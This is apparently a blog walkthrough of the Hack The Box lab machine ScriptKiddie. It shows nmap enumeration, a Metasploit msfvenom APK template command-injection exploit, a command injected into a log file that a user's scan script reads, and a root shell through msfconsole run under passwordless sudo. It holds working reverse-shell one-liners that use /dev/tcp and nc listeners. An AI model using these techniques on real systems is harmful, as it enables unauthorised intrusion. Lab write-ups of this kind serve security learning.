+++
    title = "Hack The Box: ScriptKiddie"
    date = "2021-05-06T14:24:52+10:00"
    author = "Jarrod Cameron"
    authorTwitter = "" #do not include @
    cover = "/posts/scriptkiddie/banner.png"
    tags = ["HackTheBox", "writeup"]
    keywords = ["", ""]
    description = "This machines starts out with uploading a malicious file to a HTTP web server which allows for remote code execution. This can be used to get a reverse shell to the machine. Once inside the machine, a vulnerability in a script can be exploited to get a reverse shell as a different user. This new user can then run a command with `sudo` without a password which can be exploited to get a root shell."
    showFullContent = false
    draft = false
+++

# Enumeration

It's difficult to attack a machine without knowing what's available, so firstly
`nmap` will be used to all open TCP ports.

```bash
# Run as root
nmap -sS -p- '10.10.10.226'
```

`nmap` then returns the following:

```nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 14:35 AEST
Nmap scan report for 10.10.10.226
Host is up (0.011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 86.85 seconds
```

## Enumerating Port 5000/TCP (HTTP)

Although port 5000 is not a port regularly used for HTTP, it's possible a HTTP
web server is listening on port 5000. This theory can be tested by
visiting the URL [http://10.10.10.226:5000/](http://10.10.10.226:5000/).

{{< image src="index.png" position="center" style="border-radius: 8px;" >}}

# Reverse Shell

Under the "payloads" section of the website there is an option to upload a
template. `msfvenom` (a reference from "venom it up") is a tool which generates
payloads used when writing exploits. The tool's website
([here](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/))
has a brief summary of how a template is used:

> The __-x__, or __-template__, option is used to specify an existing executable to use as a template when creating your executable payload.

## Generating Payload

Search `msfconsole` for "template" reveals an interesting payload:

```bash
msf6 > search template

Matching Modules
================

   #   Name                                                                    Disclosure Date  Rank       Check  Description
   -   ----                                                                    ---------------  ----       -----  -----------
[snip]
   16  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection
[snip]
msf6 > use 16
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) >
```

If this exploit works then a reverse shell is trivial.

{{< code language="bash" title="Setting Parameters" expand="Show" collapse="Hide" >}}
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > ip addr show tun0
[*] exec: ip addr show tun0

5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.10.14.69/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1043/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::a25d:ffa:f438:3b69/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST 10.10.14.69
LHOST => 10.10.14.69
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT 4444
LPORT => 4444
{{< /code >}}

After setting the parameters the payload needs to be generated:

{{< code language="bash" title="Setting Parameters" expand="Show" collapse="Hide" >}}
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /root/.msf4/local/msf.apk
{{< /code >}}

## Triggering the Reverse Shell

Before trying the exploit, a listener needs to be set up on the local machine.
This can be done using the following command.

{{< code language="bash" title="Setting up listener" expand="Show" collapse="Hide" >}}
nc -lvnp 4444
{{< /code >}}

Once the listener is ready, then the payload is uploaded to the victim's machine.
NOTE: The "os" must be set do "android" and the "lhost" must be set to any
valid IPv4 address (e.g. "0.0.0.0"). The page (just before uploading the
exploit) can be seen below:

{{< image src="upload.png" position="center" style="border-radius: 8px;" >}}

After pressing the "generate" button the `nc` listener is given a reverse
shell, which can be seen below


{{< code language="bash" title="Receiving the reverse shell" expand="Show" collapse="Hide" >}}
$ nc -lvnp 4444
Connection from 10.10.10.226:51106
ls
__pycache__
app.py
static
templates
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
{{< /code >}}

# Lateral Movement: "pwn"

Searching around the machine it appears there are two users. The current user
is "kid" and another non-root user is "pwn". This can be seen from looking at
the "/home/" directory.

{{< code language="bash" title="Checking out /home" expand="Show" collapse="Hide" >}}
$ ls /home
kid
pwn
{{< /code >}}

There's a file called `scanlosers.sh` which contains a glaring vulnerability.
The file can be seen below.

{{< code language="bash" title="/home/pwn/scanlosers.sh" expand="Show" collapse="Hide" >}}
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
{{< /code >}}

If the `$log` file is writable then it's possible to set `$ip` to a command
and have it executed by the "pwn" user.

{{< code language="bash" title="Permissions of \"hackers\"" expand="Show" collapse="Hide" >}}
$ ls -l /home/kid/logs/hackers
-rw-rw-r-- 1 kid pwn 0 May  7 10:33 /home/kid/logs/hackers
{{< /code >}}

Since the current shell is running as the "kid" user then the file is
writable.

## Exploiting "scanlosers.sh"

The following code would trigger a reverse shell, however it just needs to be
run by the `scanlosers.sh` script

{{< code language="bash" title="Reverse shell" expand="Show" collapse="Hide" >}}
/bin/bash -i >& /dev/tcp/10.10.14.69/5555 0>&1
{{< /code >}}

Before using the reverse shell, a listener needs to be started. Here, the
listener is listening on port 5555.

{{< code language="bash" title="Listening on port 5555" expand="Show" collapse="Hide" >}}
nc -lvnp 5555
{{< /code >}}

The following line will insert the payload into the "hackers" file. The payload
starts with some dummy characters, "a b c", since the `cut -d' ' -f3-` command
will will ignore the first three fields. The ";" is used to end the previous
command and to start the next command; the reverse shell.

{{< code language="bash" title="Reverse shell payload" expand="Show" collapse="Hide" >}}
echo "a b c ; bash -c '/bin/bash -i >& /dev/tcp/10.10.14.69/5555 0>&1' # A" >> /home/kid/logs/hackers
{{< /code >}}

Triggers a new shell for the "pwn" user.

{{< code language="bash" title="Reverse shell payload" expand="Show" collapse="Hide" >}}
pwn@scriptkiddie:~$ ls
recon
scanlosers.sh
pwn@scriptkiddie:~$ id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
{{< /code >}}

# Privilege Escalation

The `sudo -l` command will show commands that a user can run with the `sudo`
command. The following command shows the results of running `sudo -l`.

{{< code language="bash" title="Running `sudo -l`" expand="Show" collapse="Hide" >}}
pwn@scriptkiddie:~$ sudo -l
[snip]
User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
{{< /code >}}

This means the user can run `/opt/metasploit-framework-6.0.9/msfconsole` as
root without a password!

Once `msfconsole` has been started, `/bin/bash` can be used to drop to a shell,
which results in a root shell!

{{< code language="bash" title="Becoming root" expand="Show" collapse="Hide" >}}
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
[snip]
msf6 > /bin/bash
[snip]
id
uid=0(root) gid=0(root) groups=0(root)
{{< /code >}}
